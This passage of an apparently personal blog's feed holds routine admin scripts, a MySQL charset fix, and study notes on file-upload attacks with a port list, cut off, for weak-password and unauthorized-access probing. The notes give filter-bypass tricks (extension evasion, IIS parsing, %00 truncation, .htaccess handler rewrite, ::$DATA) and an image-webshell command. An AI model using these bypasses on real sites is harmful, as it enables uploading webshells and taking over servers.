class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;搭建&quot;&gt;搭建&lt;/h2&gt;
&lt;p align=&quot;center&quot;&gt;
  &lt;img title=&quot;portainer&quot; src=&#39;https://cdn.jsdelivr.net/gh/c0ny1/upload-labs/img/logo.png&#39; /&gt;
&lt;/p&gt;
&lt;p </summary>
      
    
    
    
    <category term="文件上传" scheme="https://www.dansemal.cn/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="upload-labs" scheme="https://www.dansemal.cn/tags/upload-labs/"/>
    
    <category term="文件上传" scheme="https://www.dansemal.cn/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>windows-scripts备份</title>
    <link href="https://www.dansemal.cn/posts/479e210a/"/>
    <id>https://www.dansemal.cn/posts/479e210a/</id>
    <published>2021-05-19T14:59:00.000Z</published>
    <updated>2021-06-05T06:32:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="必应每日一图下载">必应每日一图下载</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> 10</span><br><span class="line"><span class="built_in">cd</span> /root/pictures/ <span class="comment"># 下载目录</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> 0 1 2 3 4 5 6 7<span class="comment"># 0 今天 1 昨天 2 前天  以此类推......</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">tail</span>=`curl <span class="string">&quot;https://www.bing.com/HPImageArchive.aspx?format=js&amp;idx=<span class="variable">$n</span>&amp;n=1&amp;mkt=ZH-CN&quot;</span> | grep -oP <span class="string">&quot;th\?id=.*?jpg&quot;</span>`</span><br><span class="line">        image_name=`<span class="built_in">echo</span> <span class="variable">$tail</span> | grep -oP <span class="string">&#x27;OHR\.\K([a-zA-Z]+)&#x27;</span>`<span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">have=`<span class="built_in">ls</span> <span class="variable">$image_name</span>`</span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$have</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">hud=`<span class="built_in">echo</span> <span class="variable">$tail</span>|sed <span class="string">&#x27;s/1920x1080/UHD/g&#x27;</span>`</span><br><span class="line">wget -O <span class="string">&quot;<span class="variable">$&#123;image_name&#125;</span>&quot;</span> https://bing.com/<span class="variable">$&#123;hud&#125;</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;`date +%Y%m%d`  <span class="variable">$&#123;image_name&#125;</span>  下载成功&quot;</span> &gt;&gt; download.log</span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="防止windows启动卡黑屏">防止windows启动卡黑屏</h3><p>故不使用网络驱动器</p><p>win+r打开taskschd.msc</p><p>添加启动任务计划</p><p>1-复制远程资源到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">启动程序</span><br><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span><br><span class="line">启动参数</span><br><span class="line">C:\Users\A\Pictures\update.ps1</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># update.ps1</span></span><br><span class="line"><span class="built_in">Copy-Item</span> <span class="literal">-Path</span> Z:\pictures\*.jpg <span class="literal">-Destination</span> C:\Users\A\Pictures\ <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Copy-Item</span> <span class="literal">-Path</span> Z:\music\* <span class="literal">-Destination</span> C:\Users\A\Music\ <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>2-</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">启动程序</span><br><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span><br><span class="line">启动参数</span><br><span class="line">-WindowStyle Hidden -File C:\A\Portable-Mode\VSCode\update.ps1</span><br><span class="line">每7天执行一次</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># update.ps1</span></span><br><span class="line"><span class="comment"># Stop script on error</span></span><br><span class="line"><span class="variable">$ErrorActionPreference</span> = <span class="string">&#x27;Stop&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Application folder</span></span><br><span class="line"><span class="variable">$AppDir</span> = <span class="string">&quot;C:\A\Portable-Mode\VSCode&quot;</span></span><br><span class="line"><span class="comment"># Latest stable version (Win32-x64)</span></span><br><span class="line"><span class="variable">$Url</span> = <span class="string">&#x27;https://update.code.visualstudio.com/latest/win32-x64-archive/stable&#x27;</span></span><br><span class="line"><span class="comment"># Downloaded zip file</span></span><br><span class="line"><span class="variable">$DownloadFile</span> = [<span class="type">System.IO.Path</span>]::GetTempFileName() + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line"><span class="comment"># Download and unlock file</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-uri</span> <span class="variable">$Url</span> <span class="literal">-OutFile</span> <span class="variable">$DownloadFile</span></span><br><span class="line"><span class="built_in">Unblock-File</span> <span class="variable">$DownloadFile</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Unzip, overwrite code.exe</span></span><br><span class="line"><span class="built_in">Expand-Archive</span> <span class="literal">-Force</span> <span class="literal">-Path</span> <span class="variable">$DownloadFile</span> <span class="literal">-DestinationPath</span> <span class="variable">$AppDir</span></span><br><span class="line"><span class="comment"># Remove temp file</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="literal">-force</span> <span class="literal">-recurse</span> <span class="variable">$DownloadFile</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Write-Output</span> <span class="string">&#x27;Finished.&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="picture-2-格式化webp">picture_2 格式化webp</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/picture_2</span><br><span class="line">git pull</span><br><span class="line">images=$(<span class="built_in">ls</span>  *.png)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> image <span class="keyword">in</span> <span class="variable">$images</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="comment"># -q 90 指定转换质量，经试验这个值效果和压缩率都不错</span></span><br><span class="line">  cwebp <span class="variable">$image</span> -q 70 -o <span class="variable">$&#123;image%.*&#125;</span>.webp</span><br><span class="line">  <span class="built_in">rm</span> -rf <span class="variable">$image</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">date</span>=`<span class="built_in">date</span> <span class="string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment">#提交</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;图片优化<span class="subst">$(date)</span>&quot;</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure><h3 id="oxox提交替换首页图">oxox提交替换首页图</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/oxox</span><br><span class="line">git pull</span><br><span class="line"><span class="built_in">date</span>=`<span class="built_in">date</span> <span class="string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span>`</span><br><span class="line"><span class="comment"># 替换首页图</span></span><br><span class="line">today=`curl <span class="string">&quot;https://www.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1&amp;mkt=ZH-CN&quot;</span> | grep -oP <span class="string">&quot;th\?id=.*?jpg&quot;</span>`</span><br><span class="line">hud=`<span class="built_in">echo</span> <span class="variable">$today</span>|sed <span class="string">&#x27;s/1920x1080/UHD/g&#x27;</span>`</span><br><span class="line">today=<span class="string">&quot;index_img: &quot;</span><span class="string">&quot;https://bing.com/<span class="variable">$&#123;hud&#125;</span>&quot;</span></span><br><span class="line">sed -i <span class="string">&#x27;117c &#x27;</span><span class="string">&quot;<span class="variable">$&#123;today&#125;</span>&quot;</span><span class="string">&#x27;&#x27;</span> /root/oxox/_config.butterfly.yml</span><br><span class="line"><span class="comment">#提交</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;定时提交 @<span class="subst">$(date)</span>&quot;</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;必应每日一图下载&quot;&gt;必应每日一图下载&lt;/h2&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;</summary>
      
    
    
    
    <category term="scripts" scheme="https://www.dansemal.cn/categories/scripts/"/>
    
    
    <category term="windows-scripts" scheme="https://www.dansemal.cn/tags/windows-scripts/"/>
    
  </entry>
  
  <entry>
    <title>关于文章保存数据库报错</title>
    <link href="https://www.dansemal.cn/posts/46c9d2a9/"/>
    <id>https://www.dansemal.cn/posts/46c9d2a9/</id>
    <published>2021-05-19T14:01:00.000Z</published>
    <updated>2021-06-05T06:30:04.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/vfsdfdsf/article/details/89672717">MySQL数据库字符集utf8如何转utf8mb4</a><br>将数据库和已经建好的表也转换成utf8mb4</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">        更改数据库编码(字符集)：<span class="keyword">ALTER</span> DATABASE DATABASE_NAME  <span class="keyword">DEFAULT</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"></span><br><span class="line">          更改表编码(字符集)（注意：这里修改的是表的字符集，表里面字段的字符集并没有被修改）：<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> TABLE_NAME <span class="keyword">DEFAULT</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci; </span><br></pre></td></tr></table></figure><p>更改表编码(字符集)和表中所有字段的编码(字符集)：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*ALTER TABLE TABLE_NAME CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_comments <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_contents <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_fields <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_mail <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_metas <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_options <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_relationships <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_users <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/vfsdfdsf/article/details/89672717&quot;&gt;MySQL数据库字符集utf8如何转utf8mb4&lt;/a&gt;&lt;br&gt;
将数据库和已经建好的表也转换成utf8mb4&lt;/p&gt;
&lt;figure cl</summary>
      
    
    
    
    <category term="typecho" scheme="https://www.dansemal.cn/categories/typecho/"/>
    
    
    <category term="typecho" scheme="https://www.dansemal.cn/tags/typecho/"/>
    
  </entry>
  
  <entry>
    <title>数据恢复</title>
    <link href="https://www.dansemal.cn/posts/31ff5219/"/>
    <id>https://www.dansemal.cn/posts/31ff5219/</id>
    <published>2021-04-21T06:15:00.000Z</published>
    <updated>2021-06-05T06:28:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>在过去几天用了 UFS    DISK-DRILL  DATA-RESCUE RECUVA DiskGenius<br>说实话  找到数据的有   disk-drill ufs<br>ufs 找到数据但是恢复失败</p><p>这个是DISKDRILL找到的</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210421145355.png" alt="image-20210421145348686"></p><p>这是R.STUDIO找到的结果</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210421145208.png" alt="image-20210421145200688"></p><p>R.STUDIO 能够找到目录结构    超惊喜</p><p>如何使用</p><p>点击分区 右键查看文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在过去几天用了 UFS    DISK-DRILL  DATA-RESCUE RECUVA DiskGenius&lt;br&gt;
说实话  找到数据的有   disk-drill ufs&lt;br&gt;
ufs 找到数据但是恢复失败&lt;/p&gt;
&lt;p&gt;这个是DISKDRILL找到的&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="数据恢复" scheme="https://www.dansemal.cn/categories/%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D/"/>
    
    
    <category term="数据恢复" scheme="https://www.dansemal.cn/tags/%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="https://www.dansemal.cn/posts/592e5fba/"/>
    <id>https://www.dansemal.cn/posts/592e5fba/</id>
    <published>2021-04-13T05:41:00.000Z</published>
    <updated>2021-06-05T06:26:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传过程">文件上传过程</h2><p>客户端: 选择发送文件–&gt;前端检测–&gt;服务器接收–&gt;程序检测–&gt;临时文件–&gt;移动到指定目录</p><h2 id="文件上传错误代码">文件上传错误代码</h2><p>值：0; 没有错误发生，文件上传成功。<br>值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。<br>值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。<br>值：3; 文件只有部分被上传。<br>值：4; 没有文件被上传</p><h2 id="网站文件常见的后缀名">网站文件常见的后缀名</h2><p>asp<br>asa<br>cdx<br>cer<br>php<br>aspx<br>ashx<br>jsp<br>php3<br>php.a<br>shtml<br>phtml<br>过滤的时候可以传入这种格式<br>aspasp<br>phpphp<br>大小写转换</p><h2 id="造成漏洞的原因">造成漏洞的原因</h2><h3 id="程序代码和系统缺陷">程序代码和系统缺陷</h3><ul><li><p>文件可以直接上传 可执行脚本  test.php</p></li><li><p>js脚本限制  禁止 js文件运行</p><ul><li>修改 html</li><li>抓包改包</li><li>直接在 jpg上面修改代码</li><li>在包里面修改后缀名</li></ul></li><li><p>黑名单过滤不全   穷举后缀名  test.phtml<br>黑名单 指定的后缀名是禁止上传的</p></li></ul><p>白名单 就是允许上传文件后缀<br>jpg png gif 等其他图片格式</p><p>asp<br>asa<br>cdx<br>cer<br>php<br>aspx<br>ashx<br>jsp<br>php3<br>php.a<br>shtml<br>phtml<br>ASP<br>ASA<br>CDX<br>CER<br>PHP<br>ASPX<br>ASHX<br>JSP<br>PHP3<br>PHP.A<br>SHTML<br>PHTML<br>Asp<br>Asa<br>Cdx<br>Cer<br>Php<br>Aspx<br>Ashx<br>Jsp<br>Php3<br>Php.a<br>Shtml<br>Phtml</p><ul><li>文件名可控 后缀名不可控  iis6.0解析漏洞  test.asp;.jpg test.asp;jpg</li><li>目录解析漏洞 iis6.0 文件夹为 x.asp 只要上传文件到这个文件夹里 访问就会执行脚本</li><li>%00截断的应用场景<br> 直接截断文件名<br> 创建目录可控 %00截断创建目录 利用iis6.0解析漏洞 上传文件到这个目录里面<br> 截断参数 生成文件</li><li>文件类型的检测  修改 http文件类型</li><li>文件头检测     修改文件头 或 图片一句话<br> JPEG (jpg)，文件头：FFD8FF<br> PNG (png)，文件头：89504E47<br> GIF (gif)，文件头：47494638<br> TIFF (tif)，文件头：49492A00<br> Windows Bitmap (bmp)，文件头：424D<br>制作图片一句话<br>copy 1.gif/b+test.php shell.php</li></ul><h3 id="程序逻辑出错">程序逻辑出错</h3><p>双文件上传<br>空格文件上传</p><h3 id="部署环境">部署环境</h3><p>apache开启重写模块<br>LoadModule rewrite_module modules/mod_rewrite.so<br>重写解析   .htaccess<br>&lt;FilesMatch “jpg”&gt;<br>SetHandler application/x-httpd-php<br></FilesMatch></p><h3 id="配置错误-1-jpg-php">配置错误   1.jpg/.php</h3><p>iis7.0|iis7.5|nginx 开启 fast-cgi</p><h3 id="漏洞">漏洞</h3><p>nginx 0.83</p><p>/1.jpg%00php</p><h3 id="系统特性">系统特性</h3><p>上传文件名 a.php:.jpg的时候 会在目录下生成 a.php的空白文件<br>php+window+iis<br>利用 PHP 和 Windows环境的叠加特性，以下符号在正则匹配时的相等性：<br>双引号&quot;     =   点号.<br>大于符号&gt;   =   问号?<br>小于符号&lt;   =   星号*<br>文件名.&lt;或文件名.&lt;&lt;&lt;或文件名.&gt;&gt;&gt;或文件名.&gt;&gt;&lt;空文件名<br>写入 filename.&lt;&lt;&lt;</p><h3 id="NTFS交换数据流">NTFS交换数据流</h3><p>:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>创建文件</mtext><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA 创建文件 ::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">创建文件</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">::</span></span></span></span>DATA 创建和写入文件</p><h3 id="补充">补充</h3><p>window系统里面会把文件名的最后一个点 会自动去掉<br>如上传 test.php.最后还是会变成 test.php</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件上传过程&quot;&gt;文件上传过程&lt;/h2&gt;
&lt;p&gt;客户端: 选择发送文件–&amp;gt;前端检测–&amp;gt;服务器接收–&amp;gt;程序检测–&amp;gt;临时文件–&amp;gt;移动到指定目录&lt;/p&gt;
&lt;h2 id=&quot;文件上传错误代码&quot;&gt;文件上传错误代码&lt;/h2&gt;
&lt;p&gt;值：0; 没有错误</summary>
      
    
    
    
    <category term="文件上传" scheme="https://www.dansemal.cn/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="文件上传" scheme="https://www.dansemal.cn/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>穷举</title>
    <link href="https://www.dansemal.cn/posts/e93fc31a/"/>
    <id>https://www.dansemal.cn/posts/e93fc31a/</id>
    <published>2021-04-10T13:41:00.000Z</published>
    <updated>2021-06-05T06:26:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常见端口">常见端口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">1,web类(web漏洞/敏感目录)</span><br><span class="line"></span><br><span class="line">第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</span><br><span class="line"></span><br><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">8000-9090 web</span><br><span class="line"></span><br><span class="line">2,数据库类(扫描弱口令)</span><br><span class="line"></span><br><span class="line">1433 MSSQL </span><br><span class="line">1521 Oracle </span><br><span class="line">3306 MySQL </span><br><span class="line">5432 PostgreSQL </span><br><span class="line"></span><br><span class="line">3,特殊服务类(未授权/命令执行类/漏洞)</span><br><span class="line"></span><br><span class="line">443 SSL心脏滴血 </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br><span class="line"></span><br><span 